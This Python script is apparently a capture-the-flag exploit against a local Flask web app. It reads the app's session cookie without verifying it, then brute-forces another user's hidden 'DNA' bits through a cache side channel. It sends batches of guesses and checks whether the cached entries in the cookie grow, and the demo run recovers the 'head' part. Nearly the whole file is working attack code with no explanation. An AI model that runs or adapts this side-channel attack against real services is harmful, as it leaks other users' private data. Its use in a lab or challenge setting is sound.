from itsdangerous.exc import *
from itsdangerous.url_safe import URLSafeTimedSerializer
from flask.sessions import session_json_serializer
from itertools import product
import time
import requests


# Server constants
SESSION_COOKIE = "session"
SERVER_URL = "http://localhost:5000"
MAX_CACHE_SIZE = 10
BITS_IN_NUCLEOTIDE = 2
BITS_TO_NUCLEOTIDE = {
    '00': 'C',
    '01': 'G',
    '10': 'A',
    '11': 'T'
}
BIT_LEN = 38
PART_ORDER = ['body', 'head', 'eyes', 'nose', 'ears', 'mouth']
PART_TO_BITLEN = {
    'body': 6,
    'head': 8,
    'eyes': 8,
    'nose': 1,
    'ears': 7,
    'mouth': 8
}
CACHE_NAME = 'cache_for_part_to_dict'

part_right_offsets = [sum([PART_TO_BITLEN[prev] for prev in PART_ORDER[i:]]) for i in range(1, len(PART_ORDER)+1)]
PART_TO_RIGHT_OFFSET = {part: offset for part, offset in zip(PART_ORDER, part_right_offsets)}


# Attack params
TARGET_USER_ID = 3
BATCH_SIZE = MAX_CACHE_SIZE - 1

session_serializer = URLSafeTimedSerializer("random-key-which-is-wrong", serializer=session_json_serializer)

def bitstring_to_dna(bitstring):
    bit_chunks = [bitstring[i: i + BITS_IN_NUCLEOTIDE] for i in range(0, len(bitstring), BITS_IN_NUCLEOTIDE)]
    nucleotides = [BITS_TO_NUCLEOTIDE[chunk] for chunk in bit_chunks]
    return ''.join(nucleotides)

def get_cookie_data(cookie):
    _, payload = session_serializer.loads_unsafe(cookie)
    return payload[CACHE_NAME]

def leak_user_part_to_cache(part, cache_cookie=None):
    request_params = {"part": part, "id": TARGET_USER_ID}
    if cache_cookie is None:
        request_cookies = None
    else:
        request_cookies = {SESSION_COOKIE: cache_cookie}

    resp = requests.post(f"{SERVER_URL}/api/part_from_user", data=request_params, cookies=request_cookies)
    return resp.cookies[SESSION_COOKIE]

def load_part_bits_to_cache(part, part_bits, cache_cookie=None):
    right_pad = '0' * PART_TO_RIGHT_OFFSET[part]
    part_bitstring = (part_bits + right_pad).zfill(BIT_LEN)
    request_params = {"part": part, "dna": bitstring_to_dna(part_bitstring)}
    if cache_cookie is None:
        request_cookies = None
    else:
        request_cookies = {SESSION_COOKIE: cache_cookie}
    
    resp = requests.post(f"{SERVER_URL}/api/part_from_dna", data=request_params, cookies=request_cookies)
    return resp.cookies[SESSION_COOKIE]

def cache_attack_check_batch(part, batch, cache_cookie):
    for cand in batch:
        cache_cookie = load_part_bits_to_cache(part, cand, cache_cookie)
    
    final_cache = get_cookie_data(cache_cookie)

    if len(final_cache) != 1 + len(batch):
        print(f"Found {part} batch: {batch}")
        return batch
    return None

def cache_attack_find(part, candidates, cache_cookie):
    for cand in candidates:
        cookie_with_cand = load_part_bits_to_cache(part, cand, cache_cookie)
        cache_with_cand = get_cookie_data(cookie_with_cand)
        if len(cache_with_cand) == 1:
            print(f"{part} bits are {cand}")
            return cand

def cache_attack_part(part):
    cache_cookie_with_part = leak_user_part_to_cache(part)
    cur_batch = []
    correct_batch = None
    for cand_bits in product('01', repeat=PART_TO_BITLEN[part]):
        cand_bitstring = ''.join(cand_bits)
        cur_batch.append(cand_bitstring)
        if len(cur_batch) == BATCH_SIZE:
            correct_batch = cache_attack_check_batch(part, cur_batch, cache_cookie_with_part)
            cur_batch = []
            if correct_batch is not None:
                break
    
    if correct_batch is None:
        correct_batch = cur_batch
    
    return cache_attack_find(part, correct_batch, cache_cookie_with_part)
    
        
if __name__ == '__main__':
    start = time.time()
    result = cache_attack_part('head')
    end = time.time()
    print(f"Found {result} in {end - start} seconds.")